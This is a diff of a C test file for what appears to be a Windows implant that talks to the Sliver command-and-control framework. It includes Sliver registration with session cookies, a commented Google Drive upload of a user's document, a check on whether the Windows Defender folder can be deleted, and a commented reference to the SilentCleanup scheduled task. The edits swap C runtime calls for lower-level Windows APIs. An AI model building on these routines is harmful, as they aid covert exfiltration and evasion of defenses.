@@ -187,7 +187,7 @@ void test5() {
 	PDRIVE_CONFIG pDriveConfig = NULL;
 	pDriveConfig = GoogleDriveInit(szUserAgent, szClientId, szClientSecret, szRefreshToken);
 	RefreshAccessToken(pDriveConfig);
-	GoogleDriveUpload(pDriveConfig, L"C:\\Users\\Admin\\Downloads\\BC 107.docx");
+	//GoogleDriveUpload(pDriveConfig, L"C:\\Users\\Admin\\Downloads\\BC 107.docx");
 	//FreeDri
 }
 
@@ -680,7 +680,7 @@ void test31() {
 	BOOL Result = FALSE;
 
 	Result = AreProcessesRunning(List, _countof(List), 0);
-	wprintf(L"Result = %d\n", Result);
+	LogError(L"Result = %d\n", Result);
 }
 
 void test32() {
@@ -914,10 +914,10 @@ void test49() {
 	LPWSTR lpProxyUrl = NULL;
 
 	if (!WinHttpDetectAutoProxyConfigUrl(WINHTTP_AUTO_DETECT_TYPE_DNS_A, &lpProxyUrl)) {
-		wprintf(L"WinHttpDetectAutoProxyConfigUrl failed. Error code: 0x%08x\n", GetLastError());
+		LogError(L"WinHttpDetectAutoProxyConfigUrl failed. Error code: 0x%08x\n", GetLastError());
 	}
 
-	wprintf(L"lpProxyUrl: %lls", lpProxyUrl);
+	LogError(L"lpProxyUrl: %lls", lpProxyUrl);
 	GlobalFree(lpProxyUrl);
 }
 
@@ -926,12 +926,12 @@ void test50() {
 
 	SecureZeroMemory(&ProxyDefault, sizeof(ProxyDefault));
 	if (!WinHttpGetDefaultProxyConfiguration(&ProxyDefault)) {
-		wprintf(L"WinHttpGetDefaultProxyConfiguration failed. Error code: 0x%08x\n", GetLastError());
+		LogError(L"WinHttpGetDefaultProxyConfiguration failed. Error code: 0x%08x\n", GetLastError());
 		return;
 	}
 
-	wprintf(L"lpszProxy: %lls\n", ProxyDefault.lpszProxy);
-	wprintf(L"lpszProxyBypass: %lls", ProxyDefault.lpszProxyBypass);
+	LogError(L"lpszProxy: %lls\n", ProxyDefault.lpszProxy);
+	LogError(L"lpszProxyBypass: %lls", ProxyDefault.lpszProxyBypass);
 }
 
 void test51() {
@@ -960,7 +960,7 @@ void test52() {
 
 	pPlainText = Chacha20Poly1305DecryptAndVerify(SessionKey, Nonce, CipherText, _countof(CipherText), NULL, 0, &cbPlainText);
 	if (pPlainText == NULL || cbPlainText == 0) {
-		wprintf(L"Chacha20Poly1305DecryptAndVerify failed.\n");
+		LogError(L"Chacha20Poly1305DecryptAndVerify failed.\n");
 		return;
 	}
 
@@ -1114,7 +1114,7 @@ void test60() {
 }
 
 void test61() {
-	printf("%d\n", GetCurrentProcessorNumber());
+	printf("%d\n", RtlGetCurrentProcessorNumber());
 }
 
 void test62() {
@@ -1131,10 +1131,10 @@ void test62() {
 
 	printf("pSliverClient->szSessionID: %s\n", pSliverClient->szSessionID);
 	pSliverClient->HttpConfig.AdditionalHeaders[Cookie] = ALLOC(lstrlenA(pSliverClient->szSessionID) + lstrlenA(pSliverClient->lpCookiePrefix) + 1);
-	sprintf(pSliverClient->HttpConfig.AdditionalHeaders[Cookie], "%s=%s", pSliverClient->lpCookiePrefix, pSliverClient->szSessionID);
+	wsprintfA(pSliverClient->HttpConfig.AdditionalHeaders[Cookie], "%s=%s", pSliverClient->lpCookiePrefix, pSliverClient->szSessionID);
 	pMarshalledRegisterInfo = RegisterSliver(pSliverClient, &cbMarshalledRegisterInfo);
 	if (pMarshalledRegisterInfo == NULL) {
-		wprintf(L"RegisterSliver failed");
+		LogError(L"RegisterSliver failed");
 		goto CLEANUP;
 	}
 
@@ -1158,7 +1158,7 @@ void test63
 	_Inout_ PTP_WORK Work
 )
 {
-	wprintf(L"Main handler\n");
+	LogError(L"Main handler\n");
 }
 
 void test64() {
@@ -1176,7 +1176,7 @@ void test64() {
 			goto CLEANUP;
 		}
 
-		SubmitThreadpoolWork(pWork);
+		TpPostWork(pWork);
 		i++;
 		if (i == 5) {
 			break;
@@ -1196,7 +1196,7 @@ void test65() {
 
 	if (!SetCurrentDirectoryA(szBuffer)) {
 		lpRespData = ALLOC(0x100);
-		sprintf_s(lpRespData, 0x100, "SetCurrentDirectoryA failed at %s. Error code: 0x%08x", __FUNCTION__, GetLastError());
+		wsprintfA(lpRespData, "SetCurrentDirectoryA failed at %s. Error code: 0x%08x", __FUNCTION__, GetLastError());
 	}
 	else {
 		lpRespData = ALLOC(MAX_PATH);
@@ -1237,7 +1237,7 @@ void test69() {
 
 	dwReturnedLength = GetCurrentDirectoryA(10, lpBuffer);
 	HexDump(lpBuffer, MAX_PATH);
-	wprintf(L"dwReturnedLength: %d\n", dwReturnedLength);
+	LogError(L"dwReturnedLength: %d\n", dwReturnedLength);
 	FREE(lpBuffer);
 }
 
@@ -1253,11 +1253,11 @@ void test72() {
 	WCHAR wszPath[] = L"C:\\Program Files\\Windows Defender";
 
 	BOOL Result = CanPathBeDeleted(wszPath);
-	wprintf(L"Result: %d\n", Result);
+	LogError(L"Result: %d\n", Result);
 	Result = IsPathWritable(wszPath);
-	wprintf(L"Result: %d\n", Result);
+	LogError(L"Result: %d\n", Result);
 	Result = IsPathReadable(wszPath);
-	wprintf(L"Result: %d\n", Result);
+	LogError(L"Result: %d\n", Result);
 }
 
 void test73() {
@@ -1278,7 +1278,7 @@ void test75() {
 
 	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, 13220);
 	if (hProcess == NULL) {
-		wprintf(L"OpenProcess failed\n");
+		LogError(L"OpenProcess failed\n");
 		return;
 	}
 
@@ -1318,7 +1318,7 @@ void test76() {
 	}
 
 	lpVersion = ALLOC(0x20);
-	sprintf_s(lpVersion, 0x20, "%d.%d.%d.%d", HIWORD(FixedFileInfo->dwFileVersionMS), LOWORD(FixedFileInfo->dwFileVersionMS), HIWORD(FixedFileInfo->dwFileVersionLS), LOWORD(FixedFileInfo->dwFileVersionLS));
+	wsprintfA(lpVersion, "%d.%d.%d.%d", HIWORD(FixedFileInfo->dwFileVersionMS), LOWORD(FixedFileInfo->dwFileVersionMS), HIWORD(FixedFileInfo->dwFileVersionLS), LOWORD(FixedFileInfo->dwFileVersionLS));
 	uLangCodePage = GetFileVersionInfoLangCodePage(pVersionInfo);
 	lpCompanyName = GetFileVersionInfoStringEx(pVersionInfo, uLangCodePage, L"CompanyName");
 	lpFileDesc = GetFileVersionInfoStringEx(pVersionInfo, uLangCodePage, L"FileDescription");
@@ -1346,7 +1346,7 @@ void test77() {
 
 	hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, 13276);
 	if (hProc == NULL) {
-		wprintf(L"Last error: 0x%08x\n", GetLastError());
+		LogError(L"Last error: 0x%08x\n", GetLastError());
 		return;
 	}
 
@@ -1372,16 +1372,16 @@ void test79() {
 	pConnections = GetNetworkConnections(&dwNumberOfConnections);
 	for (i = 0; i < dwNumberOfConnections; i++) {
 		pConnectionEnrty = &pConnections[i];
-		printf("uProtocolType: %d\n", pConnectionEnrty->uProtocolType);
-		printf("Ipv4: ");
+		/*printf("uProtocolType: %d\n", pConnectionEnrty->uProtocolType);
+		printf("Ipv4: ");*/
 		uIpv4 = pConnectionEnrty->LocalEndpoint.Address.Ipv4;
 		SecureZeroMemory(szIPv4, sizeof(szIPv4));
 		for (j = 0; j < sizeof(ULONG); j++) {
-			sprintf(&szIPv4[lstrlenA(szIPv4)], "%d.", ((uIpv4 >> (j * 4)) & 0xFF));
+			wsprintfA(&szIPv4[lstrlenA(szIPv4)], "%d.", ((uIpv4 >> (j * 4)) & 0xFF));
 		}
 
 		szIPv4[lstrlenA(szIPv4) - 1] = '\0';
-		printf("%s", szIPv4);
+		//printf("%s", szIPv4);
 	}
 }
 
@@ -1437,7 +1437,7 @@ void test85() {
 	LPWSTR lpPath = NULL;
 
 	lpPath = GetTargetShortcutFile(L"C:\\Users\\Admin\\Desktop\\Apps\\AULA F75.lnk");
-	wprintf(L"lpPath: %lls\n", lpPath);
+	LogError(L"lpPath: %lls\n", lpPath);
 	FREE(lpPath);
 }
 
@@ -1445,14 +1445,14 @@ void test86() {
 	LPWSTR lpPath = NULL;
 
 	lpPath = GetSymbolLinkTargetPath(L"C:\\Users\\Admin\\Downloads\\Apps");
-	wprintf(L"lpPath: %lls\n", lpPath);
+	LogError(L"lpPath: %lls\n", lpPath);
 	FREE(lpPath);
 }
 
 void test87() {
 	DWORD dwFileAttribute = GetFileAttributesW(L"C:\\Users\\Admin\\Desktop\\Debug");
 	if (dwFileAttribute & FILE_ATTRIBUTE_DIRECTORY) {
-		wprintf(L"Is Folder\n");
+		LogError(L"Is Folder\n");
 	}
 	
 	return;
@@ -1463,7 +1463,7 @@ void test88() {
 
 	hModule = LoadLibraryW(L"kernel32.dll");
 	FARPROC lpProc = GetProcAddress(hModule, "HeapAlloc");
-	wprintf(L"hModule: %p, lpProc: %p\n", hModule, lpProc);
+	LogError(L"hModule: %p, lpProc: %p\n", hModule, lpProc);
 }
 
 void test89() {
@@ -1471,7 +1471,7 @@ void test89() {
 	LPWSTR lpFilePart = NULL;
 
 	GetFullPathNameW(L"..\\..\\..\\Downloads", MAX_PATH, wszFullPath, NULL);
-	wprintf(L"wszFullPath: %lls\n", wszFullPath);
+	LogError(L"wszFullPath: %lls\n", wszFullPath);
 }
 
 void test90() {
@@ -1480,12 +1480,12 @@ void test90() {
 
 	SecureZeroMemory(&TimeZone, sizeof(TimeZone));
 	GetTimeZoneInformation(&TimeZone);
-	wprintf(L"Bias: %d\n", TimeZone.Bias);
-	wprintf(L"StandardBias: %d\n", TimeZone.StandardBias);
-	wprintf(L"StandardName: %lls\n", TimeZone.StandardName);
-	wprintf(L"DaylightName: %lls\n", TimeZone.DaylightName);
-	wprintf(L"DaylightBias: %d\n", TimeZone.DaylightBias);
-	sprintf_s(szTimeZone, _countof(szTimeZone), "%03d", TimeZone.Bias / (-60));
+	LogError(L"Bias: %d\n", TimeZone.Bias);
+	LogError(L"StandardBias: %d\n", TimeZone.StandardBias);
+	LogError(L"StandardName: %lls\n", TimeZone.StandardName);
+	LogError(L"DaylightName: %lls\n", TimeZone.DaylightName);
+	LogError(L"DaylightBias: %d\n", TimeZone.DaylightBias);
+	wsprintfA(szTimeZone, "%03d", TimeZone.Bias / (-60));
 	printf("%s\n", szTimeZone);
 }
 
@@ -1511,7 +1511,7 @@ void test91() {
 
 	//uModifiedTime = GetModifiedTime(lpPath);
 	uModifiedTime = FILETIME_TO_UNIXTIME(LastWriteTime);
-	wprintf(L"%llu\n", uModifiedTime);
+	LogError(L"%llu\n", uModifiedTime);
 }
 
 void test92() {
@@ -1520,7 +1520,7 @@ void test92() {
 
 	MultiByteToWideChar(CP_UTF8, 0, Buffer, _countof(Buffer), wszOutput, _countof(wszOutput));
 	//HexDump(wszOutput, sizeof(wszOutput));
-	wprintf(L"wszOutput: %lls\n", wszOutput);
+	LogError(L"wszOutput: %lls\n", wszOutput);
 }
 
 void test93() {
@@ -1568,10 +1568,10 @@ void test98() {
 
 void test99() {
 	if (IsFolderExist(L"..\\Removerr")) {
-		wprintf(L"Folder exist\n");
+		LogError(L"Folder exist\n");
 	}
 	else {
-		wprintf(L"Folder is not exist\n");
+		LogError(L"Folder is not exist\n");
 	}
 }
 
@@ -1593,10 +1593,10 @@ void test101() {
 
 	printf("pSliverClient->szSessionID: %s\n", pSliverClient->szSessionID);
 	pSliverClient->HttpConfig.AdditionalHeaders[Cookie] = ALLOC(lstrlenA(pSliverClient->szSessionID) + lstrlenA(pSliverClient->lpCookiePrefix) + 1);
-	sprintf(pSliverClient->HttpConfig.AdditionalHeaders[Cookie], "%s=%s", pSliverClient->lpCookiePrefix, pSliverClient->szSessionID);
+	wsprintfA(pSliverClient->HttpConfig.AdditionalHeaders[Cookie], "%s=%s", pSliverClient->lpCookiePrefix, pSliverClient->szSessionID);
 	pMarshalledRegisterInfo = RegisterSliver(pSliverClient, &cbMarshalledRegisterInfo);
 	if (pMarshalledRegisterInfo == NULL) {
-		wprintf(L"RegisterSliver failed");
+		LogError(L"RegisterSliver failed");
 		goto CLEANUP;
 	}
 
@@ -1654,7 +1654,24 @@ LONG VectoredExceptionHandler
 }
 
 int main() {
-	AddVectoredExceptionHandler(1, VectoredExceptionHandler);
+	LoadLibraryW(L"advapi32.dll");
+	LoadLibraryW(L"bcrypt.dll");
+	LoadLibraryW(L"combase.dll");
+	LoadLibraryW(L"crypt32.dll");
+	LoadLibraryW(L"dbghelp.dll");
+	LoadLibraryW(L"gdi32full.dll");
+	LoadLibraryW(L"IPHLPAPI.dll");
+	LoadLibraryW(L"ole32.dll");
+	LoadLibraryW(L"oleaut32.dll");
+	LoadLibraryW(L"rpcrt4.dll");
+	LoadLibraryW(L"sechost.dll");
+	LoadLibraryW(L"shlwapi.dll");
+	LoadLibraryW(L"verifier.dll");
+	LoadLibraryW(L"vrfcore.dll");
+	LoadLibraryW(L"win32u.dll");
+	LoadLibraryW(L"winhttp.dll");
+	LoadLibraryW(L"wtsapi32.dll");
+	RtlAddVectoredExceptionHandler(1, VectoredExceptionHandler);
 	//StartTask(L"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup");
 	//test1();
 	//test2(L"C:\\Users\\Admin\\Desktop\\LogProvider.dll");
